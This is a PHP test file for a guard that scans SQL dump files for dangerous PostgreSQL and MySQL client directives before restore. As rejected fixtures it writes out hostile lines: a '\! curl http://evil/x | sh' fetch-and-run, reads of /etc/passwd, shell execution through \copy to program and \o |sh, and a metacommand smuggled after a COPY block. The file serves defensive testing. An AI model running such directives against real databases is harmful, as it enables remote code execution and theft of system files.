<?php

declare(strict_types=1);

use Devuni\Notifier\Services\Database\SqlDirectiveGuard;

function writeSqlDump(string $content): string
{
    $path = tempnam(sys_get_temp_dir(), 'sqlguard_').'.sql';
    file_put_contents($path, $content);

    return $path;
}

describe('SqlDirectiveGuard::assertPostgresSafe', function () {
    it('accepts a genuine pg_dump whose COPY data starts with backslash escapes', function () {
        // Real pg_dump plain output: SQL statements + a COPY ... FROM stdin block
        // whose data lines legitimately begin with \t, \N, \\, and end with \.
        $dump = implode("\n", [
            'SET statement_timeout = 0;',
            'CREATE TABLE public.t (id integer, note text);',
            'COPY public.t (id, note) FROM stdin;',
            "1\t\\tindented value",   // second field value starts with an escaped tab
            "\\N\tfirst field is null", // data line that STARTS with a backslash escape
            "3\tback\\\\slash",
            '\.',
            'ALTER TABLE public.t ADD CONSTRAINT t_pkey PRIMARY KEY (id);',
        ])."\n";

        $path = writeSqlDump($dump);

        SqlDirectiveGuard::assertPostgresSafe($path);

        expect(true)->toBeTrue(); // reached only if no exception was thrown

        @unlink($path);
    });

    it('rejects a \\! shell metacommand outside a COPY block', function () {
        $path = writeSqlDump("SELECT 1;\n\\! curl http://evil/x | sh\n");

        expect(fn () => SqlDirectiveGuard::assertPostgresSafe($path))
            ->toThrow(RuntimeException::class, 'client directive');

        @unlink($path);
    });

    it('rejects \\i include and \\copy file directives', function () {
        foreach (['\\i /etc/passwd', "\\copy t to program 'sh -c id'", '\\o |sh', '\\gexec'] as $directive) {
            $path = writeSqlDump("SELECT 1;\n".$directive."\n");

            expect(fn () => SqlDirectiveGuard::assertPostgresSafe($path))
                ->toThrow(RuntimeException::class);

            @unlink($path);
        }
    });

    it('does NOT let a \\! smuggled after a COPY block go unnoticed', function () {
        // The block terminates at \. so the metacommand after it must be caught.
        $dump = implode("\n", [
            'COPY public.t (id) FROM stdin;',
            '1',
            '\.',
            '\! id',
        ])."\n";

        $path = writeSqlDump($dump);

        expect(fn () => SqlDirectiveGuard::assertPostgresSafe($path))
            ->toThrow(RuntimeException::class);

        @unlink($path);
    });
});

describe('SqlDirectiveGuard::assertMysqlSafe', function () {
    it('accepts a genuine mysqldump INSERT dump', function () {
        $dump = implode("\n", [
            '-- MySQL dump 10.13',
            '/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;',
            'DROP TABLE IF EXISTS `t`;',
            'CREATE TABLE `t` (`id` int NOT NULL, `note` text);',
            "INSERT INTO `t` VALUES (1,'a back\\\\slash value'),(2,'plain');",
            'UNLOCK TABLES;',
        ])."\n";

        $path = writeSqlDump($dump);

        SqlDirectiveGuard::assertMysqlSafe($path);

        expect(true)->toBeTrue();

        @unlink($path);
    });

    it('rejects \\!, system and source client directives', function () {
        foreach (['\\! id', 'system id', 'source /etc/passwd'] as $directive) {
            $path = writeSqlDump("SELECT 1;\n".$directive."\n");

            expect(fn () => SqlDirectiveGuard::assertMysqlSafe($path))
                ->toThrow(RuntimeException::class);

            @unlink($path);
        }
    });
});
